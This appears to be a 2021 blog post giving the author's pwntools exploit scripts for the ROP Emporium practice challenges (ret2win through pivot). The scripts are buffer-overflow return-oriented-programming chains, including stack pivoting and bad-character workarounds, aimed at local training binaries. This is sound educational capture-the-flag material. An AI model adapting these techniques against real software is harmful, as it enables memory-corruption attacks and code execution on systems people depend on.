---
layout: post
title:  "ROP-Emporium Writeup"
date:   2021-03-28 11:59:00 +0900
categories: CTF
---

## ret2win
EXP:
```python
from pwn import *

sh = process("./ret2win")

x = b'1'*40 + p64(0x400756)

sh.sendline(x)
sh.interactive()
```

## split
EXP:
```python
from pwn import *

sh = process('./split')
payload = b'1'*40 + p64(0x4007c3) + p64(0x601060) + p64(0x40074b)
sh.sendline(payload)
sh.interactive()
```

## callme
EXP:
```python
from pwn import *

sh = process("./callme")

'''
'1' * 0x20 buffer 
'1' * 0x08 rbp
pop rdi,ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme_one
pop rdi, ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme two
pop rdi,ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme three
'''

pop_rdi = 0x4009a3
pop_rsi = 0x40093d
p1 = 0xdeadbeefdeadbeef
p2 = 0xcafebabecafebabe
p3 = 0xd00df00dd00df00d
call_one = 0x400720
call_two = 0x400740
call_three = 0x4006f0

payload = b'1' * 0x28
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_one)
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_two)
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_three)

#raw_input()
sh.send(payload)
sh.interactive()
```

## write4
EXP:
```python
from pwn import *

sh = process('./write4')

pop_r14_r15 = 0x400690
mov_r15_to_r14 = 0x400628
pop_rdi = 0x400693
bss = 0x601038
flag = 0x7478742e67616c66
func = 0x400510
payload = b'1'* 0x28
payload += p64(pop_r14_r15) + p64(bss) + p64(flag)
payload += p64(mov_r15_to_r14)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(func)

raw_input()
sh.send(payload)

sh.interactive()

```

## badchars
EXP:
```python
from pwn import *

sh = process('./badchars')

flag_value = 0x7479742f68626c66
plt = 0x400510
bss = 0x601038

pop_r12_15 = 0x40069c
pop_r14_r15 = 0x4006a0
mov_r12_to_r13 = 0x400634
pop_rdi = 0x4006a3
sub_r15 = 0x400630

payload = b'1'*0x28

payload += p64(pop_r12_15)
payload += p64(flag_value) + p64(bss) + p64(0x01) + p64(bss + 0x02)
payload += p64(mov_r12_to_r13)
payload += p64(sub_r15)

payload += p64(pop_r14_r15) + p64(0x01) + p64(bss + 0x03)
payload += p64(sub_r15)

payload += p64(pop_r14_r15) + p64(0x01) + p64(bss + 0x04)
payload += p64(sub_r15)

payload += p64(pop_r14_r15) + p64(0x01) + p64(bss + 0x06)
payload += p64(sub_r15)

payload += p64(pop_rdi) + p64(bss) + p64(plt)

sh.send(payload)
sh.interactive()

```

## fluff
EXP:
```python
from pwn import *

sh = process('./fluff')

pop_rdi = 0x4006a3
pop_rdx = 0x40062a
xlat = 0x400628
stosb = 0x400639
bss = 0x601038
off_len = 0x4000
plt = 0x400620

payload = b'1' * 0x28

payload += p64(pop_rdi) + p64(bss)

# f
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f4 - 0x3ef2 - 0x0b)
payload += p64(xlat) + p64(stosb)

# l
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f9 - 0x3ef2 - ord('f'))
payload += p64(xlat) + p64(stosb)

# a
payload += p64(pop_rdx) + p64(off_len) + p64(0x400418 - 0x3ef2 - ord('l'))
payload += p64(xlat) + p64(stosb)

# g
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003cf - 0x3ef2 - ord('a'))
payload += p64(xlat) + p64(stosb)

# .
payload += p64(pop_rdx) + p64(off_len) + p64(0x400439 - 0x3ef2 - ord('g'))
payload += p64(xlat) + p64(stosb)

# t
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f1 - 0x3ef2 - ord('.'))
payload += p64(xlat) + p64(stosb)

# x
payload += p64(pop_rdx) + p64(off_len) + p64(0x4006c8 - 0x3ef2 - ord('t'))
payload += p64(xlat) + p64(stosb)

# t
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f1 - 0x3ef2 - ord('x'))
payload += p64(xlat) + p64(stosb)

# pop rdi
payload += p64(pop_rdi) + p64(bss)
payload += p64(plt)

raw_input()
sh.send(payload)

sh.interactive()

```

## pivot
EXP:
```python
from pwn import *

sh = process("./pivot")

offset = 0x0a81 - 0x96a
buf_address = 0
xchg_rax_rsp = 0x4009bd
pop_rax = 0x4009bb
useless = 0x400720
got_plt = 0x601040
mov_rax_rax = 0x4009c0
add_rax_rbp = 0x4009c4
jmp_rax = 0x4007c1

sh.recvuntil("pivot: ")
addr = sh.recvline()[:-1]

buf_address = int(addr, 16)
print("0x%x" % int(addr, 16))

heap_payload = p64(useless)
heap_payload += p64(pop_rax) + p64(got_plt)
heap_payload += p64(mov_rax_rax)
heap_payload += p64(add_rax_rbp)
heap_payload += p64(jmp_rax)

#stack
payload = b'a'*0x20
payload += p64(offset) # rbp
payload += p64(pop_rax)
payload += p64(buf_address)
payload += p64(xchg_rax_rsp)

sh.send(heap_payload + b'b'*100)
raw_input()
sh.send(payload)

sh.interactive()



```